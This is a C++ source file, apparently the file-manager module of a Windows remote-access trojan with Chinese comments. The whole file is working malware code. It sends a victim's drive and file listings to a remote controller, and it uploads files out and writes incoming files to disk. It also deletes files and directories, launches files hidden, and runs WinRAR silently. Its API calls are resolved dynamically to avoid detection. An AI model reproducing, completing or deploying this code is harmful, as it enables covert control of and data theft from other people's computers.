// MyFileManager.cpp: implementation of the CMyFileManager class.
//
//////////////////////////////////////////////////////////////////////

#include "MyFileManager.h"
#include <tchar.h>
#include <winnt.h>
#include <string.h>
#include "..\\..\\svchost\\debug.h"
#include "imagehlp.h"

#pragma comment(lib,"imagehlp.lib")
#pragma comment(lib,"msvcrt.lib")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98 /nodefaultlib:libcmt.lib")

typedef struct _FILESIZE
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE,*LPFILESIZE;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


CMyFileManager::CMyFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
}

CMyFileManager::~CMyFileManager()
{
	m_UploadList.clear();
}

void CMyFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// 获取文件列表
		SendFilesList((TCHAR *)(lpBuffer + 1));
		break;
	case COMMAND_DELETE_FILE:// 删除文件
		DeleteFile((TCHAR *)(lpBuffer + 1));
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 删除文件
		DeleteDirectory((TCHAR *)(lpBuffer + 1));
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // 上传文件
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // 上传文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((TCHAR *)(lpBuffer + 1), SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((TCHAR *)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_PACK_RAR:
		Dbp("COMMAND_PACK_RAR reve");
		PackFile(lpBuffer);
		break;
	case COMMAND_UNPACK_RAR:
		Dbp("COMMAND_UNPACK_RAR reve");
		UnpackFile(lpBuffer);
		break;
	default:
		break;
	}
}

#ifdef NOUSEAPI
bool CMyFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {
        pszDirCopy = (LPTSTR)mymalloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {	
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            myfree(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        myfree(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        myfree(pszDirCopy);
        return FALSE;
    }

    myfree(pszDirCopy);
    return TRUE;
}
#endif

bool CMyFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	ShellExecute(GetDesktopWindow(),_T("open"),lpFile,NULL,NULL,nShowCmd);
	
	return 0;
}

UINT CMyFileManager::SendDriveList()
{
	char	DriveString[256];
	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
	BYTE	DriveList[1024];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表

	typedef BOOL (WINAPI *GETLOGDS)(DWORD nBufferLength,LPSTR lpBuffer); 
	HINSTANCE hdllde = GetModuleHandleW(L"KERNEL32.dll");
	GETLOGDS myGetLogds = (GETLOGDS)GetProcAddress(hdllde, "GetLogicalDriveStringsA");
	myGetLogds(sizeof(DriveString), DriveString);

	pDrive = DriveString;

	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间

	for (DWORD dwOffset = 1; *pDrive != '\0'; pDrive += strlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		GetVolumeInformationA(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFOA	sfi;

		typedef BOOL (WINAPI *SHGET )(LPCSTR pszPath,DWORD dwFileAttributes,SHFILEINFOA *psfi,UINT ,UINT); 
		HINSTANCE shell32 = LoadLibraryW(L"shell32.dll");
		SHGET   mySHGetFileInfo= (SHGET  )GetProcAddress(shell32,"SHGetFileInfoA"); 

		mySHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFOA), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		int	nTypeNameLen = strlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = strlen(FileSystem) + 1;
		
		// 计算磁盘大小
		if (pDrive[0] !='A' && pDrive[0] != 'B' && GetDiskFreeSpaceExA(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveTypeA(pDrive);
		
		
		// 磁盘空间描述占去了8字节
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// 磁盘卷标名及磁盘类型
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}

UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	TCHAR	strPath[MAX_PATH];
	TCHAR	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	
	wsprintf(strPath, _T("%s\\*.*"), lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1 
	文件名		strlen(filename) + 1 ('\0') 
	文件大小	4 
	*/
	do 
	{
		// 动态扩展缓冲区 
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (lstrcmp(pszFileName, _T(".")) == 0 || lstrcmp(pszFileName, _T("..")) == 0)
			continue;
		// 文件属性 1 字节 
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节 
		nLen = lstrlen(pszFileName)*sizeof(TCHAR);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		*(lpList + dwOffset+1) = 0;
		dwOffset++;
		dwOffset++;
		// 文件大小 8 字节 
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);

	FindClose(hFile);

	return nRet;
}

bool CMyFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	TCHAR	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, _T("%s\\*.*"), lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != _T('.'))
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				TCHAR strDirectory[MAX_PATH];
				wsprintf(strDirectory, _T("%s\\%s"), lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				TCHAR strFile[MAX_PATH];
				wsprintf(strFile, _T("%s\\%s"), lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind);

	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

UINT CMyFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	lstrcpy(m_strCurrentProcessFileName, lpszFileName);

	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = (lstrlen(lpszFileName) + 1)*sizeof(TCHAR)+ 9;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, (lstrlen(lpszFileName) + 1)*sizeof(TCHAR));

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CMyFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	TCHAR		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	SetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，数据
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// 传送下一个文件
void CMyFileManager::UploadNext()
{
#ifdef UNICODE
	list <wstring>::iterator it = m_UploadList.begin();
#else
	list <string>::iterator it = m_UploadList.begin();
#endif
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

int CMyFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CMyFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	TCHAR *temp=(TCHAR*)lpBuffer;
	
	if (temp[lstrlen(temp) - 1] == _T('\\'))
	{
		FixedUploadList((TCHAR *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((TCHAR *)lpBuffer);
	}
#ifdef UNICODE
	list <wstring>::iterator it = m_UploadList.begin();
#else
	list <string>::iterator it = m_UploadList.begin();
#endif
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}

bool CMyFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	TCHAR	lpszFilter[MAX_PATH];
	TCHAR	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != _T('\\'))
		lpszSlash = _T("\\");
	else
		lpszSlash = _T("");

	wsprintf(lpszFilter, _T("%s%s*.*"), lpPathName, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	
	do
	{
		if (wfd.cFileName[0] != _T('.'))
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				TCHAR strDirectory[MAX_PATH];
				wsprintf(strDirectory, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				TCHAR strFile[MAX_PATH];
				wsprintf(strFile, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	

	FindClose(hFind);

	return true;
}

void CMyFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();

	SendToken(TOKEN_TRANSFER_FINISH);
}

void CMyFileManager::CreateFolder(LPBYTE lpBuffer)
{
	char szPath[256];
	WideCharToMultiByte(CP_ACP,0,(TCHAR *)lpBuffer,lstrlen((TCHAR *)lpBuffer),szPath,256,NULL,NULL);
	MakeSureDirectoryPathExists(szPath);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CMyFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	lstrcpy(m_strCurrentProcessFileName, (TCHAR *)(lpBuffer + 8));

	// 保存文件长度
	//m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * (MAXDWORD + 1)) + pFileSize->dwSizeLow;
	DWORD m_nCurrentProcessFileLength =  pFileSize->dwSizeLow; ///这里文件大小不能超过4G。。。。
	
	// 创建多层目录
	char szPath[256];
	WideCharToMultiByte(CP_ACP,0,(TCHAR *)m_strCurrentProcessFileName,lstrlen((TCHAR *)m_strCurrentProcessFileName),szPath,256,NULL,NULL);
	MakeSureDirectoryPathExists(szPath);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	
	FindClose(hFind);
}

void CMyFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 传送下一个
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}

	FindClose(hFind);

	HANDLE	hFile = CreateFile(m_strCurrentProcessFileName, 
							   GENERIC_WRITE,
							   FILE_SHARE_WRITE,
							   NULL,
							   dwCreationDisposition,
							   FILE_ATTRIBUTE_NORMAL,
							   0);
							   
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}

void CMyFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	// 得到数据在文件中的偏移
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	dwBytesToWrite = nSize - 8;
	
	HANDLE	hFile = CreateFile(m_strCurrentProcessFileName,
							   GENERIC_WRITE,
							   FILE_SHARE_WRITE,
							   NULL,
							   OPEN_EXISTING,
							   FILE_ATTRIBUTE_NORMAL,
							   0);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
		// 写入文件
	nRet = WriteFile(hFile,pData,dwBytesToWrite,&dwBytesWrite,NULL);

	CloseHandle(hFile);
	// 为了比较，计数器递增

	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CMyFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CMyFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (TCHAR *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;

	HINSTANCE kernel32 = GetModuleHandleW(L"Kernel32.dll"); 

	typedef BOOL (WINAPI *MOVEF)(LPCTSTR,LPCTSTR);
#ifdef _UNICODE
	MOVEF  myMoveFile= (MOVEF)GetProcAddress(kernel32,"MoveFileW");
#else
	MOVEF  myMoveFile= (MOVEF)GetProcAddress(kernel32,"MoveFileA");
#endif

	myMoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
//http://blog.163.com/fenglin9999@126/blog/static/475672482009103055744132/
void CMyFileManager::PackFile(LPBYTE lpBuffer)
{
	//可能传入一个文件,可能传入一个文件夹
	TCHAR*	realBuffer = (TCHAR*)(lpBuffer+1);
//	OutputDebugString(realBuffer);
	HINSTANCE shell32 = LoadLibraryW(L"shell32.dll");
	HINSTANCE shlwapi = LoadLibraryW(L"shlwapi.dll");

    typedef HINSTANCE (WINAPI *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT); 
#ifdef _UNICODE
    SE myShellExecute = (SE)GetProcAddress(shell32, "ShellExecuteW");
#else
    SE myShellExecute = (SE)GetProcAddress(shell32, "ShellExecuteA");
#endif

	TCHAR 	lpRarPath[1024];
	TCHAR	lpRealPath[1024] = _T("");
	ZeroMemory(lpRarPath,1024);
	ZeroMemory(lpRealPath,1024);
	
	ReadRegEx(HKEY_CLASSES_ROOT, _T("WinRAR\\shell\\open\\command"), _T(""),
			  REG_SZ, lpRarPath, NULL, sizeof(lpRarPath), 0);
	
	int i = lstrlen(lpRarPath);
	
	for(int j=0;j<(i-17);j++)
		lpRealPath[j] = lpRarPath[j+1];
		
	lstrcat(lpRealPath,_T("rar.exe"));

	if(PathIsDirectory(realBuffer))
	{
		TCHAR rarPath[512];
		lstrcpy(rarPath,realBuffer);

		lstrcat(rarPath,_T(".rar"));

		TCHAR ConfirmPath[512];
		lstrcpy(ConfirmPath,realBuffer);

		lstrcat(ConfirmPath,_T("\\"));

		TCHAR MyCommand[512];
		wsprintf(MyCommand,_T("a -r %s %s"),rarPath,ConfirmPath);
		myShellExecute(NULL, _T("open"), lpRealPath, MyCommand, NULL, SW_HIDE);
		return;
	}
	else
	{
		TCHAR rarPath[512];
		lstrcpy(rarPath,realBuffer);
		PathRemoveExtension(rarPath);
		lstrcat(rarPath,_T(".rar"));
		
		TCHAR MyCommand[512];
		wsprintf(MyCommand,_T("a %s %s"),rarPath,realBuffer);
		myShellExecute(NULL, _T("open"), lpRealPath, MyCommand, NULL, SW_HIDE);

		return;
	}
	
}

void CMyFileManager::UnpackFile(LPBYTE lpBuffer)
{
	//传入一个文件,要解压
	TCHAR*	realBuffer = (TCHAR*)(lpBuffer+1);

	HINSTANCE shell32 = LoadLibraryW(L"shell32.dll");
	HINSTANCE shlwapi = LoadLibraryW(L"shlwapi.dll");

	typedef HINSTANCE (WINAPI *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT); 
#ifdef _UNICODE
    SE myShellExecute = (SE)GetProcAddress(shell32, "ShellExecuteW");
#else
    SE myShellExecute = (SE)GetProcAddress(shell32, "ShellExecuteA");
#endif

	TCHAR 	lpRarPath[1024];
	TCHAR	lpRealPath[1024] = _T("");
	ZeroMemory(lpRarPath,1024);
	ZeroMemory(lpRealPath,1024);
	
	ReadRegEx(HKEY_CLASSES_ROOT, _T("WinRAR\\shell\\open\\command"), _T(""),
			  REG_SZ, lpRarPath, NULL, sizeof(lpRarPath), 0);
	
	int i = lstrlen(lpRarPath);
	for(int j=0;j<(i-17);j++)
		lpRealPath[j] = lpRarPath[j+1];
		
	lstrcat(lpRealPath,_T("rar.exe")); //unpack

	//命令 rar x rar完整路径 需要解压到的目录 //

	TCHAR MyPath[512],UnpackPath[512];
	lstrcpy(MyPath,realBuffer);
	PathRemoveFileSpec(MyPath);     //获得文件的所在路径

	lstrcpy(UnpackPath,realBuffer);
	PathRemoveExtension(UnpackPath);
	lstrcat(UnpackPath,_T("\\"));

	TCHAR MyCommand[1024];
	wsprintf(MyCommand,_T("x %s %s"),realBuffer,UnpackPath);
	myShellExecute(NULL, _T("open"), lpRealPath, MyCommand, NULL, SW_HIDE);
}
